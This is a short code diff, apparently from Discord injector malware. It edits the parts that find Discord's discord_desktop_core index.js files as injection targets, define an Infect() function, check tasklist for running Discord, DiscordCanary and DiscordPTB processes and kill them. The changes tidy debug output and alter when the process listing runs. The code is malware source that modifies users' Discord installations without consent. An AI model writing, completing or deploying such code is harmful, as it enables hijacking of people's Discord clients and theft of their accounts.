@@ -23,9 +23,7 @@ discords.forEach(function(file) {
     let pattern = `${file}` + "\\app-*\\modules\\discord_desktop_core-*\\discord_desktop_core\\index.js"
     glob.sync(pattern).map(file => {
         injectPath.push(file)
-        if (injectPath.length === discords.length) {
-            listDiscords();
-        }
+        listDiscords();
     })
 });
 function Infect() {
@@ -55,15 +53,15 @@ function Infect() {
 function listDiscords() {
     exec('tasklist', function(err,stdout, stderr) {
         if (stdout.includes("Discord.exe")) {
-            console.log("Ye")
+
             runningDiscords.push("Discord")
         }
         if (stdout.includes("DiscordCanary.exe")) {
-            console.log("Ye")
+
             runningDiscords.push("DiscordCanary")
         }
         if (stdout.includes("DiscordPTB.exe")) {
-            console.log("Ye")
+
             runningDiscords.push("DiscordPTB")
         };
         killDiscord();
